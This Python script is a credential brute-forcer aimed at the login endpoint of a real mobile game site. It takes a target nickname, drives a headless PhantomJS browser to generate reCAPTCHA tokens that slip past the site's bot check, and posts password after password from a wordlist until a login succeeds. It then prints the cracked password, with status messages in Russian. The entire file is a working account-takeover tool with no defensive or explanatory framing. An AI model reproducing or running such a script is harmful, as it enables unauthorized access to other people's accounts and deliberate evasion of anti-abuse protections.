# -*- coding: utf-8 -*-
import aiohttp
import asyncio
import json
import time
import os
import argparse

from selenium import webdriver


async def main():
	userName = argparse.ArgumentParser()
	userName.add_argument('--nickname', help='set nickname', required=True)
	userName = userName.parse_args()
	userName = userName.nickname

	session = aiohttp.ClientSession()

	driver = webdriver.PhantomJS(executable_path='resources/phantomjs.exe')
	driver.get('https://samp-mobile.com/account/')

	base = open('resources/base')
	base = base.read()
	base = base.split()

	startTime = time.time()

	for userPassword in base:
		try:
			id = base.index(userPassword)
			workTime = time.time() - startTime
			workSpeed = id / workTime
		except:
			workSpeed = 0
		while True:
			driver.execute_script("grecaptcha.ready(function() {grecaptcha.execute('6LfhuPcUAAAAAPTrbOFLnwQMXDbkTrwDeZ6xodrO', {action: 'homepage'}).then(function(token) {document.getElementById('g-recaptcha-response').value=token;});});")
			g_recaptcha_response = driver.find_element_by_id('g-recaptcha-response')
			g_recaptcha_response = g_recaptcha_response.get_attribute('value')
			if not g_recaptcha_response:
				continue
			data = {
				"user_name" : userName,
				"user_password" : userPassword,
				"act" : "account_login",
				"g-recaptcha-response" : g_recaptcha_response
			}
			response = await session.post('https://samp-mobile.com/system/global_classes/Handler.php', data=data)
			response = await response.json()
			status = response['status']
			message = response['message']
			if message == 'Вы не проходите проверку от Google Recaptcha.':
				continue
			else:
				if status == 'ok':
					os.system('cls')
					print(f'Верный пароль: {userPassword}\nВремя: {int(workTime)}')
					input()
					exit()
				else:
					os.system('cls')
					print(f'Текущий пароль: {userPassword}\nВремя: {int(workTime)}\nСкорость: {int(workSpeed)}')
					break
	os.system('cls')
	print('Пароль не найден')
	input()
	exit()

loop = asyncio.get_event_loop()
loop.run_until_complete(main())